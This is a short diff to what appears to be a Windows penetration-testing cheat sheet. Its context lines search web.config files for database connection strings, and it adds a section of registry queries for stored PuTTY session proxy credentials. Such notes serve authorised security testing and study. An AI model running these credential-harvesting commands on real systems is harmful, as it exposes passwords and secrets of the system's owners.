@@ -33,3 +33,7 @@ type C:\inetpub\wwwroot\web.config | findstr connectionString
 forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
+# Retrieve Credentials from Software: PuTTY ✅
+```cmd
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
